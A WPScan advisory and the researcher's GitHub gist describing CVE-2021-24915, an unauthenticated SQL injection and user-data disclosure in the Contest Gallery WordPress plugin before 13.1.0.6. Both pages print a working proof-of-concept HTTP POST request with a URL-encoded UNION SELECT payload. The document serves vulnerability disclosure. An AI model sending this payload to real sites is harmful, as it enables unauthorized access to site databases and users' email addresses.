=== Content from wpscan.com_0418ebd6_20250115_095915.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Contest Gallery < 13.1.0.6 - Missing Access Controls to Unauthenticated SQL injection / Email Address Disclosure

### Description

The plugin does not have capability checks and does not sanitise or escape the cg-search-user-name-original parameter before using it in a SQL statement when exporting users from a gallery, which could allow unauthenticated to perform SQL injections attacks, as well as get the list of all users registered on the blog, including their username and email address

### Proof of Concept

POST /wp-admin/admin.php?page=contest-gallery/index.php&users\_management=true&option\_id=1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 318
Connection: close
Upgrade-Insecure-Requests: 1
cg-search-user-name=&cg-search-user-name-original=%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x717a6b7871%2CIFNULL%28CAST%28VERSION%28%29%20AS%20NCHAR%29%2C0x20%29%2C0x716b707871%29%2CNULL--%20-&cg\_create\_user\_data\_csv\_new\_export=true&cg-search-gallery-id-original=&cg-search-gallery-id=&cg\_create\_user\_data\_csv=true

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

contest-gallery](https://a8cteam5105.wordpress.com/plugin/contest-gallery/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 13.1.0.6

### References

CVE
[CVE-2021-24915](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24915)

URL
<https://gist.github.com/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917>

### Classification

Type
ACCESS CONTROLS

OWASP top 10
[A5: Broken Access Control](https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control)

CWE
[CWE-284](https://cwe.mitre.org/data/definitions/284.html)

CVSS
[8.6 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

### Miscellaneous

Original Researcher
Tyler Miller

Submitter
Tyler Miller

Submitter twitter
[\_treadwater](//twitter.com/_treadwater)

Verified
Yes

WPVDB ID
[45ee86a7-1497-4c81-98b8-9a8e5b3d4fac](https://a8cteam5105.wordpress.com/vulnerability/45ee86a7-1497-4c81-98b8-9a8e5b3d4fac/)

### Timeline

Publicly Published
2021-11-01 (about 3 years ago)

Added
2021-11-01 (about 3 years ago)

Last Updated
2022-04-13 (about 2 years ago)

### Other

Published
Title

Published
2021-01-22
Title
[Doneren met Mollie < 2.8.5 - Unauthorised CSV Export leading to Sensitive Data Disclosure](https://a8cteam5105.wordpress.com/vulnerability/36afc442-9634-498e-961e-4c935880cd2b/)

Published
2024-09-12
Title
[MStore API – Create Native Android & iOS Apps On The Cloud < 4.15.4 - Unauthorized User Registration](https://a8cteam5105.wordpress.com/vulnerability/0b4b6754-0e8f-455f-bf80-5043a809c8e7/)

Published
2021-10-05
Title
[JobSearch WP Job Board < 1.8.2 - Subscriber+ Add/Update Schedule Calls](https://a8cteam5105.wordpress.com/vulnerability/7e2dd5df-f758-419c-bfb8-b8e53235fede/)

Published
2024-12-11
Title
[Vayu Blocks – Gutenberg Blocks for WordPress & WooCommerce < 1.2.0 - Missing Authorization to Unauthenticated Arbitrary Plugin Installation/Activation](https://a8cteam5105.wordpress.com/vulnerability/66294caf-45dd-4767-b924-dbe6203259c0/)

Published
2021-10-05
Title
[Batch Cat <= 0.3 - Subscriber+ Arbitrary Categories Add/Set/Delete to Posts](https://a8cteam5105.wordpress.com/vulnerability/f8fdff8a-f158-46e8-94f1-f051a6c5608b/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from gist.github.com_48d2ccd8_20250115_095913.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Ftpmiller87%2F6c05596fe27dd6f69f1aaba4cbb9c917)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Ftpmiller87%2F6c05596fe27dd6f69f1aaba4cbb9c917&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Ftpmiller87%2F6c05596fe27dd6f69f1aaba4cbb9c917) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Ftpmiller87%2F6c05596fe27dd6f69f1aaba4cbb9c917&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@tpmiller87](https://avatars.githubusercontent.com/u/15959707?s=64&v=4)](/tpmiller87)

# [tpmiller87](/tpmiller87)/**[gist:6c05596fe27dd6f69f1aaba4cbb9c917](/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917)** Secret

Created
October 27, 2021 02:24

Show Gist options

* [Download ZIP](/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917/archive/09b83f59befdb0e2f49a108d733602c5939eefde.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Ftpmiller87%2F6c05596fe27dd6f69f1aaba4cbb9c917)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Ftpmiller87%2F6c05596fe27dd6f69f1aaba4cbb9c917)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917.js&quot;&gt;&lt;/script&gt;
* Save tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917 to your computer and use it in GitHub Desktop.

[Code](/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917)
[Revisions
1](/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917.js&quot;&gt;&lt;/script&gt;

Save tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917 to your computer and use it in GitHub Desktop.

[Download ZIP](/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917/archive/09b83f59befdb0e2f49a108d733602c5939eefde.zip)

Contest Gallery 13.1.0.5 SQL injection

 [Raw](/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917/raw/09b83f59befdb0e2f49a108d733602c5939eefde/gistfile1.txt)

[**gistfile1.txt**](#file-gistfile1-txt)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | In Contest Gallery Version 13.1.0.5 an SQL injection vulnerability exists when exporting user data. Found by navigating to "Edit gallery > Users Management > Export Users Data", the "cg-search-user-name-original" parameter is not sanitized properly, allowing for injection. |
| --- | --- |
|  |  |
|  | An example payload revealing victim version: |
|  |  |
|  | %27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x717a6b7871%2CIFNULL%28CAST%28VERSION%28%29%20AS%20NCHAR%29%2C0x20%29%2C0x716b707871%29%2CNULL--%20- |
|  |  |
|  | POC: |
|  |  |
|  | POST /wp-admin/admin.php?page=contest-gallery/index.php&users\_management=true&option\_id=1 HTTP/1.1 |
|  | Host: 172.16.11.129 |
|  | User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:78.0) Gecko/20100101 Firefox/78.0 |
|  | Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8 |
|  | Accept-Language: en-US,en;q=0.5 |
|  | Accept-Encoding: gzip, deflate |
|  | Referer: http://172.16.11.129/wp-admin/admin.php?page=contest-gallery%2Findex.php |
|  | Content-Type: application/x-www-form-urlencoded |
|  | Content-Length: 318 |
|  | Origin: http://172.16.11.129 |
|  | Connection: close |
|  | Cookie: wordpress\_645ea7237dc6755739a03b4455ae6c84=admin%7C1635445738%7CxypGymRlWrsbkVJOycKXrg6nQUSmSoEAPdKXhXtimZz%7C51459f3bc62cef4c77ed5b6eec3b8a3206455571db5d4f9d9639fff872bb419d; \_\_wpdm\_client=cfd314b95620d7774c7a871eed8b3bbb; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce; wp-settings-time-1=1635273846; \_\_utma=115262919.1935608114.1635126281.1635126281.1635126281.1; \_\_utmz=115262919.1635126281.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); wordpress\_test\_cookie=WP%20Cookie%20check; PHPSESSID=ov80k0rg7niu38l6ovdk57d3oq; wordpress\_logged\_in\_645ea7237dc6755739a03b4455ae6c84=admin%7C1635445738%7CxypGymRlWrsbkVJOycKXrg6nQUSmSoEAPdKXhXtimZz%7C9fbda8829a9f2412f94c97048e80167d57764a24a8d472ce25a8e6d2d523c1a9 |
|  | Upgrade-Insecure-Requests: 1 |
|  |  |
|  | cg-search-user-name=&cg-search-user-name-original=%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x717a6b7871%2CIFNULL%28CAST%28VERSION%28%29%20AS%20NCHAR%29%2C0x20%29%2C0x716b707871%29%2CNULL--%20-&cg\_create\_user\_data\_csv\_new\_export=true&cg-search-gallery-id-original=&cg-search-gallery-id=&cg\_create\_user\_data\_csv=true |

[![@tpmiller87](https://avatars.githubusercontent.com/u/15959707?s=80&v=4)](/tpmiller87)

Copy link

Author

### **[tpmiller87](/tpmiller87)** commented [Oct 27, 2021](/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917?permalink_comment_id=3940975#gistcomment-3940975)

[![export_button](https://user-images.githubusercontent.com/15959707/138989267-7c21f694-87fd-45f0-a6f5-086ff86aa614.png)](https://user-images.githubusercontent.com/15959707/138989267-7c21f694-87fd-45f0-a6f5-086ff86aa614.png)

[![intercepted_sqli](https://user-images.githubusercontent.com/15959707/138989268-fdb5318c-7bfd-4552-8bbb-d26641a38a38.png)](https://user-images.githubusercontent.com/15959707/138989268-fdb5318c-7bfd-4552-8bbb-d26641a38a38.png)

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Ftpmiller87%2F6c05596fe27dd6f69f1aaba4cbb9c917)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


